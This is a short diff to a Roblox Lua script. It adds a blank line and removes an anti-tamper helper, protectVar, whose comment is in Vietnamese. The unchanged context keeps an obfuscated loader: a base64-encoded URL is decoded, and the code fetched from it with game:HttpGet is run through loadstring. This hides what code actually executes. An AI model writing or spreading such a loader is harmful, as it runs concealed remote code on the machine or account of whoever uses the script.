@@ -1,3 +1,4 @@
+
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
@@ -216,16 +217,3 @@ end
 
 local realURL = decodeBase64(b64)
 loadstring(game:HttpGet(realURL))()
-
-local function protectVar(var, name)
-	if _G["__" .. name] then
-		warn("Variable tampered: " .. name)
-		script:Destroy()
-		return nil
-	end
-	_G["__" .. name] = var
-	return var
-end
-
--- Ví dụ dùng:
-local Players = protectVar(game:GetService("Players"), "Players")
